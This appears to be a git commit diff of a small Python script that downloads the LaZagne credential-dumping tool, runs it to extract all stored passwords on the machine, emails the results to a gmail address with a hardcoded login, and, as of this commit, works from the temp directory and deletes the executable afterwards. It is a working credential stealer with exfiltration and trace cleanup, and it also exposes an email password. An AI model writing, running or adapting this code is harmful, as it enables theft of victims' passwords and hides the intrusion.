624971e4ea4d654d70bfa79754294d4f891d7de1
Sergey Nazemtsev <42sdn@mail.ru>
2021-08-08 15:06:03 +0700

    Download files + reporting on e-mail with Lazagne

--- download_and_report.py
+++ download_and_report.py
@@ -1,4 +1,4 @@
-import requests, subprocess, smtplib
+import requests, subprocess, smtplib, os, tempfile
 
 
 def download(url):
@@ -16,6 +16,9 @@ def send_mail(email, password, message):
     server.quit()
 
 
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
 download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
 result = subprocess.check_output("lazagne.exe all", shell=True)
 send_mail("sereganazemcev@gmail.com", "22833720041917Master", result)
+os.remove("lazagne.exe")
